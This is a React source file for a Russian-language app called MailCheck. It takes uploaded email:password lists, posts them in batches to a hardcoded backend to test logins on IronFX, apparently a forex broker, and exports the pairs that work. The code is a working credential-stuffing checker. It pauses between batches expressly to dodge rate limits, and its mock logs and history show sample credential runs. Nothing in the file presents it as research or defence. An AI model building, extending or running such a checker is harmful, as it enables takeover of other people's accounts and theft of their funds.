import { useState, useCallback, useRef, useEffect } from 'react';
import Icon from '@/components/ui/icon';

const API_URL = 'https://functions.poehali.dev/846a31b2-cbc7-4cf9-af36-05c734062cdb';
const BATCH_SIZE = 5;

type CheckStatus = 'valid' | 'invalid' | 'pending' | 'error' | 'captcha' | 'unknown';

interface CheckResult {
  id: string;
  email: string;
  password: string;
  status: CheckStatus;
  checkedAt: string;
  responseTime?: number;
}

interface LogEntry {
  id: string;
  time: string;
  message: string;
  type: 'info' | 'success' | 'error' | 'warn';
}

type Section = 'home' | 'upload' | 'check' | 'results' | 'history';

const NAV_ITEMS: { id: Section; label: string; icon: string }[] = [
  { id: 'home', label: 'Главная', icon: 'LayoutDashboard' },
  { id: 'upload', label: 'Загрузка', icon: 'Upload' },
  { id: 'check', label: 'Проверка', icon: 'ShieldCheck' },
  { id: 'results', label: 'Результаты', icon: 'ListChecks' },
  { id: 'history', label: 'История', icon: 'Clock' },
];

const MOCK_RESULTS: CheckResult[] = [
  { id: '1', email: 'user@example.com', password: 'pass123', status: 'valid', checkedAt: '09.06.2026 14:32', responseTime: 312 },
  { id: '2', email: 'admin@test.ru', password: 'qwerty', status: 'invalid', checkedAt: '09.06.2026 14:32', responseTime: 521 },
  { id: '3', email: 'hello@mail.ru', password: 'abc456', status: 'valid', checkedAt: '09.06.2026 14:31', responseTime: 289 },
  { id: '4', email: 'info@company.com', password: 'test999', status: 'error', checkedAt: '09.06.2026 14:31', responseTime: 1201 },
  { id: '5', email: 'contact@firm.ru', password: 'mypass', status: 'invalid', checkedAt: '09.06.2026 14:30', responseTime: 445 },
];

const MOCK_LOGS: LogEntry[] = [
  { id: '1', time: '14:32:11', message: 'Загружено 5 строк из файла credentials.txt', type: 'info' },
  { id: '2', time: '14:32:12', message: 'Начата проверка: user@example.com', type: 'info' },
  { id: '3', time: '14:32:12', message: 'VALID → user@example.com:pass123 (312ms)', type: 'success' },
  { id: '4', time: '14:32:13', message: 'INVALID → admin@test.ru:qwerty (521ms)', type: 'error' },
  { id: '5', time: '14:32:13', message: 'VALID → hello@mail.ru:abc456 (289ms)', type: 'success' },
  { id: '6', time: '14:32:14', message: 'ERROR → info@company.com — timeout (1201ms)', type: 'warn' },
  { id: '7', time: '14:32:14', message: 'INVALID → contact@firm.ru:mypass (445ms)', type: 'error' },
  { id: '8', time: '14:32:15', message: 'Проверка завершена. Итого: 5 строк', type: 'info' },
];

function StatCard({ label, value, color, icon, delay }: { label: string; value: string | number; color: string; icon: string; delay?: string }) {
  return (
    <div
      className={`glass-card rounded-2xl p-5 flex flex-col gap-2 opacity-0 animate-fade-in-up ${delay ?? ''}`}
      style={{ borderColor: `${color}30`, boxShadow: `0 0 20px ${color}10` }}
    >
      <div className="flex items-center justify-between">
        <span className="text-sm text-white/40 font-medium uppercase tracking-widest">{label}</span>
        <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: `${color}15` }}>
          <Icon name={icon} size={16} style={{ color }} />
        </div>
      </div>
      <div className="text-3xl font-black font-mono" style={{ color }}>{value}</div>
    </div>
  );
}

function StatusBadge({ status }: { status: CheckStatus }) {
  const map: Record<CheckStatus, { label: string; cls: string }> = {
    valid: { label: 'VALID', cls: 'status-valid' },
    invalid: { label: 'INVALID', cls: 'status-invalid' },
    pending: { label: 'PENDING', cls: 'status-pending' },
    error: { label: 'ERROR', cls: 'status-pending' },
    captcha: { label: 'CAPTCHA', cls: 'status-pending' },
    unknown: { label: 'UNKNOWN', cls: 'status-pending' },
  };
  const { label, cls } = map[status];
  return (
    <span className={`text-xs font-mono font-bold px-2.5 py-1 rounded-md ${cls}`}>{label}</span>
  );
}

export default function Index() {
  const [section, setSection] = useState<Section>('home');
  const [inputText, setInputText] = useState('');
  const [parsedLines, setParsedLines] = useState<string[]>([]);
  const [isChecking, setIsChecking] = useState(false);
  const [progress, setProgress] = useState(0);
  const [results, setResults] = useState<CheckResult[]>([]);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [apiUrl, setApiUrl] = useState('');
  const [apiMethod, setApiMethod] = useState('POST');
  const [notifications, setNotifications] = useState<{ id: string; msg: string; type: string }[]>([]);
  const [filterStatus, setFilterStatus] = useState<'all' | CheckStatus>('all');
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const logRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const addNotification = useCallback((msg: string, type = 'info') => {
    const id = Date.now().toString();
    setNotifications(prev => [...prev, { id, msg, type }]);
    setTimeout(() => setNotifications(prev => prev.filter(n => n.id !== id)), 4000);
  }, []);

  useEffect(() => {
    if (logRef.current) {
      logRef.current.scrollTop = logRef.current.scrollHeight;
    }
  }, [logs]);

  const parseLines = (text: string) => {
    const lines = text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    setParsedLines(lines);
    return lines;
  };

  const handleTextChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setInputText(e.target.value);
    parseLines(e.target.value);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      const text = ev.target?.result as string;
      setInputText(text);
      const lines = parseLines(text);
      addNotification(`Загружено ${lines.length} строк из ${file.name}`, 'success');
    };
    reader.readAsText(file);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    const file = e.dataTransfer.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      const text = ev.target?.result as string;
      setInputText(text);
      const lines = parseLines(text);
      addNotification(`Загружено ${lines.length} строк из ${file.name}`, 'success');
    };
    reader.readAsText(file);
  };

  const startCheck = async () => {
    if (parsedLines.length === 0) {
      addNotification('Нет данных для проверки', 'error');
      return;
    }
    setIsChecking(true);
    setProgress(0);
    setResults([]);
    setLogs([]);
    setSection('check');

    const credentials = parsedLines.map(line => {
      const idx = line.indexOf(':');
      return { email: line.slice(0, idx), password: line.slice(idx + 1) };
    });

    setLogs([{
      id: '0',
      time: new Date().toLocaleTimeString('ru'),
      message: `Начата проверка ${credentials.length} аккаунтов на IronFX`,
      type: 'info',
    }]);

    let done = 0;

    // Разбиваем на батчи
    for (let b = 0; b < credentials.length; b += BATCH_SIZE) {
      const batch = credentials.slice(b, b + BATCH_SIZE);

      setLogs(prev => [...prev, {
        id: Date.now().toString(),
        time: new Date().toLocaleTimeString('ru'),
        message: `Отправляю батч ${Math.floor(b / BATCH_SIZE) + 1}: ${batch.map(c => c.email).join(', ')}`,
        type: 'info',
      }]);

      try {
        const t0 = Date.now();
        const resp = await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ credentials: batch }),
        });
        const data = await resp.json();
        const elapsed = Date.now() - t0;

        const batchResults: CheckResult[] = (data.results || []).map((r: {
          email: string; password: string; status: string; message?: string; http_code?: number; elapsed_ms?: number; response_preview?: string;
        }) => ({
          id: Date.now().toString() + Math.random(),
          email: r.email,
          password: r.password,
          status: (r.status as CheckStatus) || 'error',
          checkedAt: new Date().toLocaleString('ru'),
          responseTime: r.elapsed_ms ?? Math.round(elapsed / batch.length),
          message: r.message,
          response_preview: r.response_preview,
        }));

        setResults(prev => [...prev, ...batchResults]);

        batchResults.forEach(r => {
          const logType = r.status === 'valid' ? 'success' : r.status === 'error' || r.status === 'captcha' ? 'warn' : 'error';
          const extra = (r as CheckResult & { message?: string; response_preview?: string });
          setLogs(prev => [...prev, {
            id: Date.now().toString() + Math.random(),
            time: new Date().toLocaleTimeString('ru'),
            message: `${r.status.toUpperCase()} → ${r.email} — ${extra.message || ''} (${r.responseTime}ms)`,
            type: logType,
          }]);
          // Показываем preview ответа если статус неизвестный
          if (r.status === 'unknown' || r.status === 'captcha') {
            setLogs(prev => [...prev, {
              id: Date.now().toString() + Math.random(),
              time: '',
              message: `  ↳ PREVIEW: ${(extra.response_preview || '').slice(0, 120)}`,
              type: 'info',
            }]);
          }
        });

      } catch (err) {
        setLogs(prev => [...prev, {
          id: Date.now().toString(),
          time: new Date().toLocaleTimeString('ru'),
          message: `Ошибка сети при отправке батча: ${err}`,
          type: 'error',
        }]);
      }

      done += batch.length;
      setProgress(Math.round((done / credentials.length) * 100));

      // Пауза между батчами чтобы не словить rate-limit
      if (b + BATCH_SIZE < credentials.length) {
        await new Promise(res => setTimeout(res, 1500));
      }
    }

    setIsChecking(false);
    setProgress(100);
    addNotification('Проверка IronFX завершена!', 'success');
    setLogs(prev => [...prev, {
      id: 'done',
      time: new Date().toLocaleTimeString('ru'),
      message: `Завершено. Проверено: ${credentials.length}`,
      type: 'info',
    }]);
  };

  const exportResults = (type: 'all' | 'valid' | 'invalid') => {
    const filtered = type === 'all' ? results : results.filter(r => r.status === type);
    const text = filtered.map(r => `${r.email}:${r.password}`).join('\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `mailcheck_${type}_${Date.now()}.txt`;
    a.click();
    addNotification(`Экспортировано ${filtered.length} строк`, 'success');
  };

  const validCount = results.filter(r => r.status === 'valid').length;
  const invalidCount = results.filter(r => r.status === 'invalid').length;
  const errorCount = results.filter(r => r.status === 'error').length;
  const filteredResults = filterStatus === 'all' ? results : results.filter(r => r.status === filterStatus);

  return (
    <div className="min-h-screen bg-[var(--surface-1)] grid-bg flex">

      {/* Notifications */}
      <div className="fixed top-4 right-4 z-50 flex flex-col gap-2">
        {notifications.map(n => (
          <div
            key={n.id}
            className={`glass-card px-4 py-3 rounded-xl text-sm font-medium flex items-center gap-2 animate-slide-in-left shadow-2xl ${
              n.type === 'success' ? 'border-[var(--neon-green)] text-[var(--neon-green)]' :
              n.type === 'error' ? 'border-[var(--neon-red)] text-[var(--neon-red)]' :
              'border-[var(--neon-blue)] text-[var(--neon-blue)]'
            }`}
          >
            <Icon name={n.type === 'success' ? 'CheckCircle' : n.type === 'error' ? 'XCircle' : 'Info'} size={14} />
            {n.msg}
          </div>
        ))}
      </div>

      {/* Sidebar */}
      <aside
        className={`${sidebarOpen ? 'w-56' : 'w-16'} flex-shrink-0 transition-all duration-300 flex flex-col glass-card border-r border-white/5 min-h-screen sticky top-0 h-screen z-40`}
      >
        <div className="p-4 flex items-center gap-3 border-b border-white/5">
          <div className="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 scan-line" style={{ background: 'linear-gradient(135deg, #00ffb3, #4daaff)' }}>
            <Icon name="ShieldCheck" size={18} className="text-[var(--surface-1)]" />
          </div>
          {sidebarOpen && (
            <div className="flex flex-col overflow-hidden">
              <span className="font-black text-sm text-white leading-none">MailCheck</span>
              <span className="text-xs text-white/30 font-mono">v1.0</span>
            </div>
          )}
          <button
            onClick={() => setSidebarOpen(v => !v)}
            className="ml-auto text-white/30 hover:text-white/70 transition-colors"
          >
            <Icon name={sidebarOpen ? 'PanelLeftClose' : 'PanelLeftOpen'} size={16} />
          </button>
        </div>

        <nav className="flex-1 p-2 flex flex-col gap-1 mt-2">
          {NAV_ITEMS.map(item => (
            <button
              key={item.id}
              onClick={() => setSection(item.id)}
              className={`flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-medium transition-all duration-200 group ${
                section === item.id
                  ? 'text-[var(--surface-1)]'
                  : 'text-white/50 hover:text-white/80 hover:bg-white/5'
              }`}
              style={section === item.id ? { background: 'linear-gradient(135deg, var(--neon-green), #4daaff)' } : {}}
            >
              <Icon name={item.icon} size={18} className="flex-shrink-0" />
              {sidebarOpen && <span>{item.label}</span>}
            </button>
          ))}
        </nav>

        {sidebarOpen && (
          <div className="p-3 m-2 rounded-xl" style={{ background: 'rgba(0,255,179,0.05)', border: '1px solid rgba(0,255,179,0.1)' }}>
            <div className="flex items-center gap-2 mb-1">
              <div className="w-2 h-2 rounded-full bg-[var(--neon-green)] animate-pulse" />
              <span className="text-xs font-mono text-[var(--neon-green)]">ГОТОВ</span>
            </div>
            <div className="text-xs text-white/30">{parsedLines.length} строк загружено</div>
          </div>
        )}
      </aside>

      {/* Main */}
      <main className="flex-1 flex flex-col overflow-auto">

        <header className="sticky top-0 z-30 glass-card border-b border-white/5 px-6 py-3 flex items-center gap-4">
          <div className="flex-1">
            <h1 className="text-lg font-black text-white capitalize">{NAV_ITEMS.find(n => n.id === section)?.label}</h1>
          </div>
          <div className="hidden md:flex items-center gap-2 overflow-hidden w-64 text-xs font-mono text-white/20">
            <Icon name="Activity" size={12} className="text-[var(--neon-green)] flex-shrink-0" />
            <div className="overflow-hidden flex-1">
              <div className="whitespace-nowrap" style={{ animation: 'ticker 15s linear infinite' }}>
                VALID: {validCount} &nbsp;·&nbsp; INVALID: {invalidCount} &nbsp;·&nbsp; TOTAL: {results.length} &nbsp;·&nbsp; VALID: {validCount} &nbsp;·&nbsp; INVALID: {invalidCount} &nbsp;·&nbsp; TOTAL: {results.length}
              </div>
            </div>
          </div>
          {isChecking && (
            <div className="flex items-center gap-2 text-xs font-mono text-[var(--neon-yellow)]">
              <div className="w-2 h-2 rounded-full bg-[var(--neon-yellow)] animate-pulse" />
              ПРОВЕРКА {progress}%
            </div>
          )}
        </header>

        <div className="flex-1 p-6">

          {/* HOME */}
          {section === 'home' && (
            <div className="max-w-5xl mx-auto space-y-8">
              <div className="opacity-0 animate-fade-in-up">
                <div className="inline-flex items-center gap-2 text-xs font-mono px-3 py-1.5 rounded-full mb-4" style={{ background: 'rgba(0,255,179,0.1)', border: '1px solid rgba(0,255,179,0.2)', color: 'var(--neon-green)' }}>
                  <div className="w-1.5 h-1.5 rounded-full bg-[var(--neon-green)] animate-pulse" />
                  СИСТЕМА АКТИВНА
                </div>
                <h2 className="text-5xl font-black text-white leading-tight mb-3">
                  Проверяй пары<br />
                  <span className="neon-text">email:пароль</span>
                </h2>
                <p className="text-white/50 text-lg max-w-xl">Загружай списки, настраивай API-эндпоинт и получай мгновенные результаты с подробной статистикой</p>
              </div>

              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <StatCard label="Всего" value={results.length} color="#4daaff" icon="Database" delay="delay-100" />
                <StatCard label="Валидных" value={validCount} color="#00ffb3" icon="CheckCircle" delay="delay-200" />
                <StatCard label="Невалидных" value={invalidCount} color="#ff4d6d" icon="XCircle" delay="delay-300" />
                <StatCard label="Ошибок" value={errorCount} color="#ffd700" icon="AlertTriangle" delay="delay-400" />
              </div>

              <div className="grid md:grid-cols-3 gap-4">
                {[
                  { icon: 'Upload', title: 'Загрузка файла', desc: 'Перетащи txt-файл или вставь список вручную', section: 'upload' as Section, color: '#4daaff' },
                  { icon: 'Zap', title: 'Быстрая проверка', desc: 'Настрой API и запусти проверку в один клик', section: 'check' as Section, color: '#00ffb3' },
                  { icon: 'Download', title: 'Экспорт', desc: 'Скачай валидные, невалидные или все результаты', section: 'results' as Section, color: '#b44dff' },
                ].map((card, i) => (
                  <button
                    key={card.section}
                    onClick={() => setSection(card.section)}
                    className={`glass-card rounded-2xl p-5 text-left group hover:scale-[1.02] transition-all duration-300 opacity-0 animate-fade-in-up`}
                    style={{ borderColor: `${card.color}20`, animationDelay: `${(i + 2) * 100}ms` }}
                  >
                    <div className="w-10 h-10 rounded-xl flex items-center justify-center mb-3 group-hover:scale-110 transition-transform" style={{ background: `${card.color}15` }}>
                      <Icon name={card.icon} size={20} style={{ color: card.color }} />
                    </div>
                    <div className="font-bold text-white mb-1">{card.title}</div>
                    <div className="text-sm text-white/40">{card.desc}</div>
                    <div className="flex items-center gap-1 mt-3 text-xs font-medium" style={{ color: card.color }}>
                      Перейти <Icon name="ArrowRight" size={12} />
                    </div>
                  </button>
                ))}
              </div>

              <div className="glass-card rounded-2xl p-5 neon-border-purple opacity-0 animate-fade-in-up delay-500">
                <div className="flex items-center gap-3 mb-4">
                  <Icon name="Globe" size={18} className="text-[var(--neon-purple)]" />
                  <span className="font-bold text-white">API Эндпоинт</span>
                  <span className="text-xs font-mono text-white/30 ml-auto">Настройка</span>
                </div>
                <div className="flex gap-3">
                  <select
                    value={apiMethod}
                    onChange={e => setApiMethod(e.target.value)}
                    className="bg-white/5 border border-white/10 text-white text-sm rounded-lg px-3 py-2 font-mono"
                  >
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                  </select>
                  <input
                    type="text"
                    value={apiUrl}
                    onChange={e => setApiUrl(e.target.value)}
                    placeholder="https://example.com/login"
                    className="flex-1 bg-white/5 border border-white/10 text-white text-sm rounded-lg px-4 py-2 font-mono placeholder:text-white/20 focus:border-[var(--neon-purple)] outline-none transition-colors"
                  />
                  <button
                    onClick={() => addNotification('API сохранён', 'success')}
                    className="px-4 py-2 rounded-lg text-sm font-bold transition-all"
                    style={{ background: 'rgba(180,77,255,0.15)', color: 'var(--neon-purple)', border: '1px solid rgba(180,77,255,0.3)' }}
                  >
                    Сохранить
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* UPLOAD */}
          {section === 'upload' && (
            <div className="max-w-3xl mx-auto space-y-6 animate-fade-in">
              <div>
                <h2 className="text-2xl font-black text-white mb-1">Загрузка данных</h2>
                <p className="text-white/40 text-sm">Формат строк: <span className="font-mono text-[var(--neon-green)]">email:пароль</span> — каждая с новой строки</p>
              </div>

              <div
                onDrop={handleDrop}
                onDragOver={e => e.preventDefault()}
                className="rounded-2xl border-2 border-dashed border-white/10 p-10 text-center hover:border-[var(--neon-green)] hover:bg-[rgba(0,255,179,0.03)] transition-all cursor-pointer group"
                onClick={() => fileInputRef.current?.click()}
              >
                <input ref={fileInputRef} type="file" accept=".txt,.csv" onChange={handleFileUpload} className="hidden" />
                <div className="w-14 h-14 mx-auto rounded-2xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform" style={{ background: 'rgba(0,255,179,0.1)' }}>
                  <Icon name="FileUp" size={28} className="text-[var(--neon-green)]" />
                </div>
                <div className="font-bold text-white mb-1">Перетащи файл или нажми</div>
                <div className="text-sm text-white/30">.txt / .csv формат</div>
              </div>

              <div className="flex items-center gap-4">
                <div className="flex-1 h-px bg-white/10" />
                <span className="text-xs text-white/30 font-mono">или введи вручную</span>
                <div className="flex-1 h-px bg-white/10" />
              </div>

              <div className="space-y-2">
                <textarea
                  value={inputText}
                  onChange={handleTextChange}
                  rows={12}
                  placeholder={'user@example.com:password123\nadmin@test.ru:qwerty456\n...'}
                  className="w-full bg-[var(--surface-2)] border border-white/10 text-white text-sm rounded-2xl p-4 font-mono placeholder:text-white/20 focus:border-[var(--neon-green)] outline-none transition-colors resize-none"
                />
                <div className="flex items-center justify-between text-xs font-mono text-white/30">
                  <span>Строк: <span className="text-[var(--neon-green)]">{parsedLines.length}</span></span>
                  <button onClick={() => { setInputText(''); setParsedLines([]); }} className="hover:text-[var(--neon-red)] transition-colors">
                    Очистить
                  </button>
                </div>
              </div>

              <button
                onClick={startCheck}
                disabled={parsedLines.length === 0}
                className="w-full glow-btn py-3 rounded-xl flex items-center justify-center gap-2 disabled:opacity-30 disabled:cursor-not-allowed disabled:transform-none disabled:shadow-none"
              >
                <Icon name="Play" size={18} />
                Начать проверку ({parsedLines.length})
              </button>
            </div>
          )}

          {/* CHECK */}
          {section === 'check' && (
            <div className="max-w-4xl mx-auto space-y-6 animate-fade-in">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-black text-white mb-1">Проверка</h2>
                  <p className="text-white/40 text-sm">Прогресс выполнения и логи в реальном времени</p>
                </div>
                <button
                  onClick={startCheck}
                  disabled={isChecking || parsedLines.length === 0}
                  className="glow-btn px-5 py-2.5 rounded-xl text-sm flex items-center gap-2 disabled:opacity-30 disabled:cursor-not-allowed disabled:transform-none disabled:shadow-none"
                >
                  <Icon name={isChecking ? 'Loader' : 'Play'} size={16} className={isChecking ? 'animate-spin' : ''} />
                  {isChecking ? 'Идёт проверка...' : 'Запустить'}
                </button>
              </div>

              <div className="glass-card rounded-2xl p-4 neon-border">
                <div className="flex items-center gap-2 mb-3">
                  <Icon name="Settings" size={16} className="text-[var(--neon-green)]" />
                  <span className="text-sm font-bold text-white">Настройки проверки</span>
                </div>
                <div className="grid md:grid-cols-3 gap-3">
                  <div>
                    <label className="text-xs text-white/40 mb-1 block">Метод</label>
                    <select value={apiMethod} onChange={e => setApiMethod(e.target.value)} className="w-full bg-white/5 border border-white/10 text-white text-sm rounded-lg px-3 py-2 font-mono">
                      <option value="POST">POST</option>
                      <option value="GET">GET</option>
                    </select>
                  </div>
                  <div className="md:col-span-2">
                    <label className="text-xs text-white/40 mb-1 block">API URL</label>
                    <input
                      type="text"
                      value={apiUrl}
                      onChange={e => setApiUrl(e.target.value)}
                      placeholder="https://example.com/login"
                      className="w-full bg-white/5 border border-white/10 text-white text-sm rounded-lg px-3 py-2 font-mono placeholder:text-white/20 focus:border-[var(--neon-green)] outline-none"
                    />
                  </div>
                </div>
              </div>

              <div className="glass-card rounded-2xl p-5">
                <div className="flex justify-between text-sm mb-3">
                  <span className="text-white/60">Прогресс</span>
                  <span className="font-mono font-bold text-[var(--neon-green)]">{progress}%</span>
                </div>
                <div className="h-3 bg-white/5 rounded-full overflow-hidden">
                  <div className="h-full progress-bar rounded-full transition-all duration-300" style={{ width: `${progress}%` }} />
                </div>
                <div className="grid grid-cols-3 gap-4 mt-4 text-center">
                  <div>
                    <div className="text-xl font-black font-mono neon-text">{validCount}</div>
                    <div className="text-xs text-white/30">Valid</div>
                  </div>
                  <div>
                    <div className="text-xl font-black font-mono neon-text-red">{invalidCount}</div>
                    <div className="text-xs text-white/30">Invalid</div>
                  </div>
                  <div>
                    <div className="text-xl font-black font-mono" style={{ color: 'var(--neon-yellow)' }}>{errorCount}</div>
                    <div className="text-xs text-white/30">Errors</div>
                  </div>
                </div>
              </div>

              <div className="glass-card rounded-2xl overflow-hidden">
                <div className="flex items-center gap-2 px-4 py-3 border-b border-white/5">
                  <div className="flex gap-1.5">
                    <div className="w-3 h-3 rounded-full bg-[#ff5f57]" />
                    <div className="w-3 h-3 rounded-full bg-[#febc2e]" />
                    <div className="w-3 h-3 rounded-full bg-[#28c840]" />
                  </div>
                  <span className="text-xs font-mono text-white/30 ml-2">terminal</span>
                  {isChecking && <div className="ml-auto w-2 h-2 rounded-full bg-[var(--neon-green)] animate-pulse" />}
                </div>
                <div ref={logRef} className="h-64 overflow-y-auto p-4 space-y-1 text-xs font-mono">
                  {logs.map(log => (
                    <div key={log.id} className={`flex gap-3 ${
                      log.type === 'success' ? 'text-[var(--neon-green)]' :
                      log.type === 'error' ? 'text-[var(--neon-red)]' :
                      log.type === 'warn' ? 'text-[var(--neon-yellow)]' :
                      'text-white/50'
                    }`}>
                      <span className="text-white/20 flex-shrink-0">{log.time}</span>
                      <span>{log.message}</span>
                    </div>
                  ))}
                  {isChecking && (
                    <div className="flex gap-3 text-white/40">
                      <span className="text-white/20">{new Date().toLocaleTimeString('ru')}</span>
                      <span>█<span className="animate-blink">_</span></span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* RESULTS */}
          {section === 'results' && (
            <div className="max-w-5xl mx-auto space-y-6 animate-fade-in">
              <div className="flex items-center justify-between flex-wrap gap-3">
                <div>
                  <h2 className="text-2xl font-black text-white mb-1">Результаты</h2>
                  <p className="text-white/40 text-sm">Всего записей: {results.length}</p>
                </div>
                <div className="flex items-center gap-2 flex-wrap">
                  {(['all', 'valid', 'invalid', 'error'] as const).map(f => (
                    <button
                      key={f}
                      onClick={() => setFilterStatus(f)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                        filterStatus === f ? 'text-[var(--surface-1)]' : 'text-white/40 bg-white/5 hover:text-white/70'
                      }`}
                      style={filterStatus === f ? { background: 'var(--neon-green)' } : {}}
                    >
                      {f.toUpperCase()} {f !== 'all' && `(${results.filter(r => r.status === f).length})`}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={() => exportResults('valid')} className="flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all" style={{ background: 'rgba(0,255,179,0.1)', color: 'var(--neon-green)', border: '1px solid rgba(0,255,179,0.2)' }}>
                    <Icon name="Download" size={14} /> Valid
                  </button>
                  <button onClick={() => exportResults('all')} className="flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all" style={{ background: 'rgba(77,170,255,0.1)', color: 'var(--neon-blue)', border: '1px solid rgba(77,170,255,0.2)' }}>
                    <Icon name="Download" size={14} /> Все
                  </button>
                </div>
              </div>

              <div className="glass-card rounded-2xl overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-white/5">
                      <th className="text-left px-4 py-3 text-xs font-mono text-white/30 uppercase">#</th>
                      <th className="text-left px-4 py-3 text-xs font-mono text-white/30 uppercase">Email</th>
                      <th className="text-left px-4 py-3 text-xs font-mono text-white/30 uppercase">Пароль</th>
                      <th className="text-left px-4 py-3 text-xs font-mono text-white/30 uppercase">Статус</th>
                      <th className="text-left px-4 py-3 text-xs font-mono text-white/30 uppercase">Время</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredResults.map((r, i) => (
                      <tr key={r.id} className="border-b border-white/5 hover:bg-white/[0.03] transition-colors animate-fade-in-up" style={{ animationDelay: `${i * 30}ms` }}>
                        <td className="px-4 py-3 text-xs font-mono text-white/20">{i + 1}</td>
                        <td className="px-4 py-3 font-mono text-white/80">{r.email}</td>
                        <td className="px-4 py-3 font-mono text-white/40">{r.password}</td>
                        <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
                        <td className="px-4 py-3 text-xs font-mono text-white/30">{r.responseTime}ms</td>
                      </tr>
                    ))}
                    {filteredResults.length === 0 && (
                      <tr>
                        <td colSpan={5} className="px-4 py-12 text-center text-white/30 text-sm">Нет результатов</td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* HISTORY */}
          {section === 'history' && (
            <div className="max-w-4xl mx-auto space-y-6 animate-fade-in">
              <div>
                <h2 className="text-2xl font-black text-white mb-1">История проверок</h2>
                <p className="text-white/40 text-sm">Все прошлые сессии</p>
              </div>

              <div className="space-y-3">
                {[
                  { date: '09.06.2026 14:32', total: 5, valid: 2, invalid: 2, error: 1, file: 'credentials.txt' },
                  { date: '08.06.2026 11:20', total: 120, valid: 43, invalid: 71, error: 6, file: 'list_08062026.txt' },
                  { date: '07.06.2026 09:05', total: 300, valid: 87, invalid: 198, error: 15, file: 'accounts.csv' },
                  { date: '05.06.2026 18:47', total: 50, valid: 12, invalid: 35, error: 3, file: 'test_list.txt' },
                ].map((session, i) => (
                  <div
                    key={i}
                    className="glass-card rounded-2xl p-5 hover:border-[rgba(0,255,179,0.15)] transition-all cursor-pointer opacity-0 animate-fade-in-up"
                    style={{ animationDelay: `${i * 100 + 100}ms` }}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: 'rgba(0,255,179,0.1)' }}>
                          <Icon name="FileText" size={16} className="text-[var(--neon-green)]" />
                        </div>
                        <div>
                          <div className="font-mono text-sm text-white">{session.file}</div>
                          <div className="text-xs text-white/30 font-mono">{session.date}</div>
                        </div>
                      </div>
                      <button className="text-xs px-3 py-1.5 rounded-lg transition-all" style={{ background: 'rgba(77,170,255,0.1)', color: 'var(--neon-blue)', border: '1px solid rgba(77,170,255,0.15)' }}>
                        Загрузить
                      </button>
                    </div>
                    <div className="flex items-center gap-4">
                      <div className="flex-1 h-2 bg-white/5 rounded-full overflow-hidden flex">
                        <div className="h-full bg-[var(--neon-green)]" style={{ width: `${(session.valid / session.total) * 100}%` }} />
                        <div className="h-full bg-[var(--neon-red)]" style={{ width: `${(session.invalid / session.total) * 100}%` }} />
                        <div className="h-full bg-[var(--neon-yellow)]" style={{ width: `${(session.error / session.total) * 100}%` }} />
                      </div>
                      <div className="flex gap-3 text-xs font-mono flex-shrink-0">
                        <span className="text-[var(--neon-green)]">{session.valid} ✓</span>
                        <span className="text-[var(--neon-red)]">{session.invalid} ✗</span>
                        <span className="text-white/30">{session.total} всего</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

        </div>
      </main>
    </div>
  );
}